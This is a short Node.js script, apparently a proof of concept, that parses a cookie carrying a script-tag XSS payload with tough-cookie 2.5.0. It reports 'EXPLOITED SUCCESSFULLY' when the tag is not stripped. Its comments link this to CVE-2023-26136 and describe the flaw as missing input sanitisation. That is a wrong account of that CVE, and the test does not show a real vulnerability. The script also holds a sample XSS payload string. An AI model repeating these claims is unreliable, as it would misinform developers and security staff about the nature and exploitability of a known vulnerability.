// Import the 'tough-cookie' module.
// Using the vulnerable version 2.5.0 of 'tough-cookie', which has a known security issue (CVE-2023-26136).
// This version improperly handles untrusted input, allowing malicious data to be processed as a valid cookie.
const tough = require('tough-cookie');
const Cookie = tough.Cookie;

// Simulating a malicious cookie that contains a JavaScript script tag.
// In a real-world scenario, this could be an attacker attempting to perform a Cross-Site Scripting (XSS) attack.
const unsafeCookieString = 'session=<script>alert("xss")</script>';

// Attempting to parse the malicious cookie string using 'tough-cookie'.
// Due to the vulnerability, the library does not sanitize the input properly.
const unsafeCookie = Cookie.parse(unsafeCookieString);

// Check if the parsed cookie's value still contains the malicious <script> tag.
// If it does, the vulnerability is present, and the exploit is considered successful.
if (unsafeCookie && unsafeCookie.value.includes('<script>')) {
    // Outputting 'EXPLOITED SUCCESSFULLY' indicates that the script tag was not sanitized and the vulnerability is still exploitable.
    // This demonstrates that an attacker could inject arbitrary JavaScript code into cookies, which can be executed in a user's browser.
    console.log('EXPLOITED SUCCESSFULLY');
} else {
    // Outputting 'EXPLOIT FAILED' means that the library has successfully sanitized the input, making the exploit ineffective.
    // This would be the expected result if the vulnerability was fixed in the library.
    console.log('EXPLOIT FAILED');
}